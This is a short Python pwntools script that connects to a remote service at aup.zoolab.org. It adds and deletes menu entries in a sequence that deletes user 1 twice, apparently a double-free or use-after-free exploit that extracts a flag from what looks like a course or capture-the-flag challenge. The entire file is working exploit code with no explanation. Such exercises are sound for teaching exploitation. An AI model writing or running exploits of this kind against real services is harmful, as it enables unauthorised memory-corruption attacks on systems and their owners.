from pwn import *
r = remote('aup.zoolab.org', 38158)

r.recvuntil('Enter your choice:')
r.sendline('a')
r.recvuntil('Enter username:')
r.sendline('aaa')

r.recvuntil('Enter your choice:')
r.sendline('a')
r.recvuntil('Enter username:')
r.sendline('bbb')

r.recvuntil('Enter your choice:')
r.sendline('d')
r.recvuntil('Which user do you want to delete (1-5)?')
r.sendline('1')

r.recvuntil('Enter your choice:')
r.sendline('d')
r.recvuntil('Which user do you want to delete (1-5)?')
r.sendline('2')

r.recvuntil('Enter your choice:')
r.sendline('d')
r.recvuntil('Which user do you want to delete (1-5)?')
r.sendline('1')

r.recvuntil('Enter your choice:')
r.sendline('a')
r.recvuntil('Enter username:')
r.sendline('aaa')

r.recvuntil('Enter your choice:')
r.sendline('a')
r.recvuntil('Enter username:')
r.sendline('bbb')

r.recvuntil('Enter your choice:')
r.sendline('a')
r.recvuntil('Enter username:')
r.sendline('ccc')

r.recvuntil('Enter your choice:')
r.sendline('s')
print(r.recvuntil('}').decode())





